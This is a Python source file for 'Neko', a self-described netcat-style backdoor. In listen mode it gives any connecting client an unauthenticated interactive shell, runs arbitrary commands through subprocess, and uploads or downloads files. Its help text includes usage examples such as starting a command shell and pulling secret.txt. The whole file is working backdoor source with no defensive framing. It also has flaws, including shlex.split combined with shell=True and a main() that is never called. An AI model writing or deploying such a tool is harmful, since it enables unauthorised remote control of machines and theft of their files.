import socket
import subprocess
import shlex
import argparse
import textwrap
import sys
import threading
import os

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return ''
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"[!] Command failed:\n{e.output.decode()}"
    except FileNotFoundError:
        return f"[!] Command not found: {cmd}\n"
    except Exception as e:
        return f"[!] Error executing command: {str(e)}\n"

class Neko:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        try:
            self.socket.settimeout(10)
            self.socket.connect((self.args.target, self.args.port))
            if self.buffer:
                self.socket.send(self.buffer)

            if self.args.download:
                with open(self.args.download, 'wb') as f:
                    while True:
                        data = self.socket.recv(4096)
                        if not data:
                            break
                        f.write(data)
                print(f"[+] Downloaded file: {self.args.download}")
                return

            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ') + '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
        except Exception as e:
            print(f'[!] Connection failed: {e}')
        finally:
            self.socket.close()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f'[+] Listening on {self.args.target}:{self.args.port}')
        while True:
            client_sock, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_sock,)
            )
            client_thread.start()

    def handle(self, client_sock):
        try:
            if self.args.execute:
                output = execute(self.args.execute)
                client_sock.send(output.encode())

            elif self.args.upload:
                file_buffer = b''
                while True:
                    data = client_sock.recv(4096)
                    if data:
                        file_buffer += data
                    else:
                        break
                with open(self.args.upload, 'wb') as f:
                    f.write(file_buffer)
                message = f'[+] Saved file to: {self.args.upload}'
                client_sock.send(message.encode())

            elif self.args.download:
                try:
                    with open(self.args.download, 'rb') as f:
                        file_data = f.read()
                    client_sock.send(file_data)
                except Exception as e:
                    error_msg = f'[!] Failed to read file: {e}'
                    client_sock.send(error_msg.encode())

            elif self.args.command:
                cmd_buffer = b''
                while True:
                    client_sock.send(b'neko:#> ')
                    while b'\n' not in cmd_buffer:
                        data = client_sock.recv(64)
                        if not data:
                            break
                        cmd_buffer += data

                    command = cmd_buffer.decode().strip()
                    if command.startswith('cd '):
                        try:
                            os.chdir(command[3:].strip())
                            response = f"[+] Changed directory to {os.getcwd()}\n"
                        except Exception as e:
                            response = f"[!] cd failed: {e}\n"
                    elif command in ['cls', 'clear']:
                        response = '\n' * 100
                    else:
                        response = execute(command)

                    client_sock.send(response.encode())
                    cmd_buffer = b''

        except Exception as e:
            print(f'[!] Server crashed: {e}')
        finally:
            client_sock.close()

def main():
    parser = argparse.ArgumentParser(
        description='Neko: Netcat-style backdoor tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
        Examples:
          neko -t 192.168.1.109 -p 5050 -l -c           # Start command shell
          neko -t 192.168.1.109 -p 5050 -l -u file.txt  # Upload file
          neko -t 192.168.1.109 -p 5050 -l -e="dir"     # Execute command
          neko -t 192.168.1.109 -p 5050 -d secret.txt   # Download file
          echo "Hello" | neko -t 192.168.1.109 -p 5050  # Echo text to server
        ''')
    )
    parser.add_argument('-c', '--command', action='store_true', help='Command shell')
    parser.add_argument('-e', '--execute', help='Execute a command on connection')
    parser.add_argument('-l', '--listen', action='store_true', help='Listen for incoming connections')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Target port')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='Target IP')
    parser.add_argument('-u', '--upload', help='Upload file to server')
    parser.add_argument('-d', '--download', help='Download file from server')
    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nk = Neko(args, buffer.encode())
    nk.run()
